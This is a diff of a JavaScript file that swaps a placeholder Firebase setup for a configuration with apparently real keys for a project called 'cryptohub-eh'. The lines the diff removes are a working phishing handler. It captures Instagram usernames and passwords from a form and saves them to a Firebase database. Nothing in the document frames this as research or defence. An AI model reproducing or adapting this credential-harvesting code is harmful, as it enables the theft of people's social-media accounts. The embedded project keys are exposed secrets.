@@ -1,41 +1,22 @@
-// Firebase Configuration
+// Import the functions you need from the SDKs you need
+import { initializeApp } from "firebase/app";
+import { getAnalytics } from "firebase/analytics";
+// TODO: Add SDKs for Firebase products that you want to use
+// https://firebase.google.com/docs/web/setup#available-libraries
+
+// Your web app's Firebase configuration
+// For Firebase JS SDK v7.20.0 and later, measurementId is optional
 const firebaseConfig = {
-    apiKey: "YOUR_API_KEY",
-    authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
-    databaseURL: "https://YOUR_PROJECT_ID.firebaseio.com",
-    projectId: "YOUR_PROJECT_ID",
-    storageBucket: "YOUR_PROJECT_ID.appspot.com",
-    messagingSenderId: "YOUR_SENDER_ID",
-    appId: "YOUR_APP_ID"
+  apiKey: "AIzaSyDCcf9XYXhvM0g8SUKb8qZeqEycx-jNCCc",
+  authDomain: "cryptohub-eh.firebaseapp.com",
+  databaseURL: "https://cryptohub-eh-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "cryptohub-eh",
+  storageBucket: "cryptohub-eh.firebasestorage.app",
+  messagingSenderId: "150967492197",
+  appId: "1:150967492197:web:67b1bd1678fca2d295708c",
+  measurementId: "G-P58EZLKP7F"
 };
 
 // Initialize Firebase
-firebase.initializeApp(firebaseConfig);
-const database = firebase.database();
-
-// Form Submission (Save Data to Firebase)
-document.getElementById('registrationForm').addEventListener('submit', function(event) {
-    event.preventDefault(); // Prevent form from submitting the default way
-
-    const instaUsername = document.getElementById('instaUsername').value;
-    const instaPassword = document.getElementById('instaPassword').value;
-
-    // Check if both fields are filled
-    if (instaUsername && instaPassword) {
-        // Push data to Firebase Realtime Database
-        database.ref('users/').push({
-            username: instaUsername,
-            password: instaPassword,
-            timestamp: new Date().toISOString()
-        });
-
-        // Show success message after data submission
-        document.getElementById('successMessage').style.display = 'block';
-
-        // Clear the form
-        document.getElementById('instaUsername').value = '';
-        document.getElementById('instaPassword').value = '';
-    } else {
-        alert("Please fill in both the username and password fields!");
-    }
-});
+const app = initializeApp(firebaseConfig);
+const analytics = getAnalytics(app);
